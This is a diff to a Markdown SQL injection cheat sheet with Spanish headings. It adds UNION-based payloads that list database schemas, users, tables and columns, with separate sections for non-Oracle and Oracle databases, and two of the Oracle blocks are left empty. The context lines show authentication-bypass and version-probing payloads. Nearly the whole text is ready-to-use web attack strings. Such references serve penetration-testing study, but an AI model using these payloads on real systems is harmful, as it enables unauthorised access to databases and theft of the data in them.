@@ -24,3 +24,32 @@ abc' or '1'='1
 ' union select @@version,null-- -
 ' union select SERVERPROPERTY('productversion'),null-- -
 ```
+### Bases de datos
+#### Non-Oracle
+```sql
+' union select null,DISTINCT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA-- -
+```
+#### Oracle
+```sql
+' union select null,DISTINCT(USERNAME) FROM ALL_USERS-- -
+```
+### Tablas
+#### Non-Oracle
+```sql
+' union select null,table_name FROM information_schema.tables-- -
+```
+#### Oracle
+```sql
+
+```
+### Columnas
+#### Non-Oracle
+```sql
+' union select null,column_name FROM information_schema.columns where table_name='NOMBRE DE LA TABLA'-- -
+```
+#### Oracle
+```sql
+
+```
+
+
